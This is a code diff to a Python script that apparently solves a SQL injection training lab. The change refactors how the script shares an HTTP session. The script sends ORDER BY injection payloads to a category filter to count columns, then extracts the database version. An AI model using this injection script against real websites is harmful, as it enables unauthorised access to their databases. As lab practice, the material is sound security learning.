@@ -5,10 +5,9 @@ from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 
 
-def get_num_of_columns(lab_url):
+
+def get_num_of_columns(lab_url, session):
     try:
-        session = requests.Session()
-        session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
         num_of_columns = 0
         for i in range(1, 20):
             response = session.get(f"{lab_url}/filter?category=x'+ORDER+BY+{i}%23", timeout=10)
@@ -30,7 +29,7 @@ def get_num_of_columns(lab_url):
         sys.exit(1)
 
 
-def get_db_version(lab_url, num_of_columns):
+def get_db_version(lab_url, session, num_of_columns):
     session = requests.Session()
     session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
     for i in range(num_of_columns):
@@ -53,11 +52,12 @@ def main():
 
 
     lab_url = sys.argv[1].rstrip("/")
-    num_of_columns = get_num_of_columns(lab_url)
-    database_version = get_db_version(lab_url, num_of_columns)
+    session = requests.Session()
+    session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
+
+    num_of_columns = get_num_of_columns(lab_url, session)
+    database_version = get_db_version(lab_url, session, num_of_columns)
     print(f"(+) Database version: {database_version}")
-
-
 
 
 if __name__ == "__main__":
